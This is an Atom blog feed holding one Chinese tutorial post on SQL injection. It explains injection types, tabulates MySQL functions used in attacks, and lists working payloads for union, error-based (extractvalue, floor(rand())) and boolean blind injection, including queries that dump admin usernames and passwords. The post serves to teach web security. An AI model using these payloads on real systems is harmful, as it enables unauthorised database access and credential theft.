<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hacker明</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-04-24T10:45:41.774Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Li Weiming</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sql注入</title>
    <link href="http://example.com/2023/04/10/hello-world/"/>
    <id>http://example.com/2023/04/10/hello-world/</id>
    <published>2023-04-10T02:34:11.027Z</published>
    <updated>2023-04-24T10:45:41.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h2><p>在动态网站中，往往需要用户传递参数到服务器，这些参数往往需要和数据库进行交互；当服务端没有对参数进行安全过滤时，攻击者在参数中加入恶意的SQL语句结构，便编造成了SQL注入漏洞</p><h2 id="二、注入分类"><a href="#二、注入分类" class="headerlink" title="二、注入分类"></a>二、注入分类</h2><p>0x00 联合注入</p><p>0x01 http-header注入</p><p>0x02 报错注入</p><p>0x03 布尔型盲注</p><p>0x04 延时注入</p><p>0x05 宽字节注入</p><p>0x06 堆叠注入</p><p>0x08 偏移注入</p><h2 id="三、注入类型"><a href="#三、注入类型" class="headerlink" title="三、注入类型"></a>三、注入类型</h2><p>在SQL注入漏洞中，注入类型分为三种：数字型、字符型、搜索型   </p><h3 id="（1）数字型"><a href="#（1）数字型" class="headerlink" title="（1）数字型"></a>（1）数字型</h3><p>在 Web 端中经常能看到是例如<code>http://xxx.com/news.php?id=1</code> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句结构通常为 <code>select * from news where id=1</code>，如果攻击者将参数id的值改为<code>1 or 1=1</code>，那么程序中拼接的sql语句则为：<code>select * from news where id=1 or 1=1</code>，因此参数改变了原有的SQL语句结构，导致了SQL注入漏洞攻击。</p><h3 id="（2）字符型"><a href="#（2）字符型" class="headerlink" title="（2）字符型"></a>（2）字符型</h3><p>在 Web 端中也经常能看到例如<code>http://xxx.com/news.php?name=admin</code> 这种形式的URL地址，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句结构通常为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 where name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure><p>当攻击者在参数值<code>admin</code>尾部加入攻击代码<code>&#39; or 1=1</code>,那么拼接出来的sql注入语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where chr=&#x27;admin&#x27; or 1=1 </span><br></pre></td></tr></table></figure><p>这样SQL语句同样也会被改变，当然攻击者也不仅仅使用这么简单的攻击代码，通常还会使用一些更加复杂的攻击代码，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure><p>在程序中拼接SQL语句之后，则变成了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from news where chr=&#x27;admin&#x27; union select 1,2,3,4 or &#x27;1&#x27;=&#x27;1&#x27; </span><br></pre></td></tr></table></figure><h3 id="（3）搜索型"><a href="#（3）搜索型" class="headerlink" title="（3）搜索型"></a>（3）搜索型</h3><p>很多时候我们会看到网站有个站内搜索的功能，搜索功能往往需要和数据库进行交互，因此也会存在SQL注入漏洞风险，搜索型SQL注入的特点是攻击代码中有两个<code>%</code> ,如下图所示</p><p><img src="D:\Downloads\Typicture\7000.png" alt="img"></p><p>在上图中可以看到，这个地方原本是用来搜索相关用户名的，当攻击代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%xxxx% or 1=1 #%&#x27;</span><br></pre></td></tr></table></figure><h2 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h2><h3 id="MySQL数据库常用函数与参数"><a href="#MySQL数据库常用函数与参数" class="headerlink" title="MySQL数据库常用函数与参数"></a>MySQL数据库常用函数与参数</h3><table><thead><tr><th align="left">&#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D; 、&lt;&gt;</th><th>比较运算符</th></tr></thead><tbody><tr><td align="left">and、or</td><td>逻辑运算符</td></tr><tr><td align="left">version( )&#x2F;@@version</td><td>mysql数据库版本</td></tr><tr><td align="left">database( )</td><td>当前数据库名</td></tr><tr><td align="left">sleep( )</td><td>睡眠时间为指定的秒数</td></tr><tr><td align="left">if(true,t,f)</td><td>if判断</td></tr><tr><td align="left">length( )</td><td>返回字符串的长度</td></tr><tr><td align="left">substring( )</td><td>截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</td></tr><tr><td align="left">substr( )</td><td></td></tr><tr><td align="left">mid( )</td><td></td></tr><tr><td align="left">left( )</td><td>从左侧开始取指定字符个数的字符串</td></tr><tr><td align="left">right()</td><td>从右侧开始取指定字符个数的字符串</td></tr><tr><td align="left">concat( )</td><td>没有分隔符的连接字符串</td></tr><tr><td align="left">concat_ws ( )</td><td>含有分割符的连接字符串</td></tr><tr><td align="left">group_conat( )</td><td>连接一个组的字符串</td></tr><tr><td align="left">ord( )</td><td>返回ASCII码</td></tr><tr><td align="left">ascii( )</td><td>返回ASCII码</td></tr><tr><td align="left">hex( )</td><td>将字符串转换为十六进制</td></tr><tr><td align="left">unhex( )</td><td>hex的反向操作</td></tr><tr><td align="left">md5( )</td><td>返回MD5值</td></tr><tr><td align="left">floor(x)</td><td>返回不大于x的最大整数</td></tr><tr><td align="left">round ( )</td><td>返回参数x接近的整数</td></tr><tr><td align="left">rand( )</td><td>返回0-1之间的随机浮点数</td></tr><tr><td align="left">exp(n)</td><td>返回e的n次方</td></tr><tr><td align="left">updatexml(XML_document, XPath_string, new_value)</td><td>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br/>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法<br/>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br/></td></tr><tr><td align="left">extractvalue(XML_document, XPath_string)</td><td>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br/>第二个参数：XPath_string (Xpath格式的字符串).</td></tr><tr><td align="left">load_file( )</td><td>读取文件，并返回文件内容作为一个字符串</td></tr><tr><td align="left">into outfile</td><td>函数into outfile 与 into dumpfile都是写文件</td></tr><tr><td align="left">find_in_set( )</td><td>返回字符串在字符串列表中的位置</td></tr><tr><td align="left">benchmark( )</td><td>指定语句执行的次数</td></tr><tr><td align="left">name_const ( )</td><td>返回表作为结果</td></tr><tr><td align="left">user( )</td><td>用户名</td></tr><tr><td align="left">current_user( )</td><td>当前用户名</td></tr><tr><td align="left">system_user( )</td><td>系统用户名</td></tr><tr><td align="left">@@datadir</td><td>数据库路径</td></tr><tr><td align="left">@@version_compile_os</td><td>操作系统版本</td></tr></tbody></table><h2 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h2><h3 id="常用查询语法"><a href="#常用查询语法" class="headerlink" title="常用查询语法"></a>常用查询语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列出(数据库：test)中所有的表</span><br><span class="line"> limit 一个一个打印出来字段名</span><br><span class="line">  select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;test&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"> group_concat 一次性全部显示</span><br><span class="line">  select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x674657374</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列出（数据库：test 表：admin ）中所有的字段</span><br><span class="line"> limit 一个一个打印出来</span><br><span class="line">  select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&#x27;test&#x27; and TABLE_NAME=&#x27;t10&#x27; limit 0,1</span><br><span class="line">  </span><br><span class="line"> group_concat 一次性全部显示</span><br><span class="line">  select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">列出（数据库：test 表：admin ）中的数据</span><br><span class="line"> limit 一个一个打印出来</span><br><span class="line">  select username,passwd from test.admin limit 0,1</span><br><span class="line"></span><br><span class="line"> group_concat 把 一次性全部打印</span><br><span class="line">  select group_concat(concat(username,0x20,passwd)) from test.admin</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(*),concat((select (select (payload)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e,(select @@version),0x7e))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and exists(select * from information_schema.tables) --+</span><br><span class="line">?id=1&#x27; and (select length(version()))=6 --+   //判断version()返回字符串长度。</span><br><span class="line">?id=1&#x27; and (select count(table_schema) from information_schema.tables) &gt; 8 --+ </span><br><span class="line">//判断有多少数据库</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and (select ascii(substr((select table_schema from information_schema.tables limit 0, 1), 1, 1)))&gt;105 --+ //判断第一个库的第一个字符</span><br><span class="line">判断库或者表的总体长度  SELECT LENGTH((payload)) &gt; 6</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一、原理&quot;&gt;&lt;a href=&quot;#一、原理&quot; class=&quot;headerlink&quot; title=&quot;一、原理&quot;&gt;&lt;/a&gt;一、原理&lt;/h2&gt;&lt;p&gt;在动态网站中，往往需要用户传递参数到服务器，这些参数往往需要和数据库进行交互；当服务端没有对参数进行安全过滤时，攻击者在参数</summary>
      
    
    
    
    
  </entry>
  
</feed>
